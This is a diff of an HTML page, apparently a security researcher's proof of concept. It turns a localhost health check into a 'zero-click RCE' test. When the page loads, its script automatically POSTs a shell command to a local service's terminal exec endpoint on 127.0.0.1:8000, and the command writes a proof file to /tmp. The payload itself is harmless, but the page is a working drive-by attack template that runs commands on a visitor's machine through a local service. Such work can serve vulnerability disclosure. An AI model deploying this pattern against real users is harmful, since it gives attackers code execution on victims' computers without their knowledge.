@@ -2,15 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Root Cyber Localhost Security Test</title>
+  <title>Root Cyber Zero-Click RCE Test</title>
 </head>
 <body>
-  <h2>Root Cyber Browser Security Test</h2>
-
-  <p>Testing automatic localhost access...</p>
-
-  <pre id="result">Waiting for automatic test...</pre>
+  <h2>Root Cyber Zero-Click RCE Test</h2>
+  <pre id="result">Waiting...</pre>
 
   <script>
     window.addEventListener("load", async () => {
@@ -18,20 +14,25 @@
 
       try {
         const response = await fetch(
-          "http://127.0.0.1:8000/health"
+          "http://127.0.0.1:8000/terminal/zero-click-poc-001/exec",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              command:
+                "printf 'RC_ZERO_CLICK_RCE_CONFIRMED\\n' > /tmp/rc-zero-click-proof.txt"
+            })
+          }
         );
 
-        const body = await response.text();
-
         output.textContent =
-          "Automatic localhost request completed.\n" +
-          "HTTP Status: " + response.status + "\n" +
-          "Response:\n" + body;
+          "HTTP: " + response.status + "\n" +
+          await response.text();
 
       } catch (error) {
-        output.textContent =
-          "Automatic localhost request blocked or failed.\n" +
-          "Error: " + error;
+        output.textContent = "Request failed: " + error;
       }
     });
   </script>
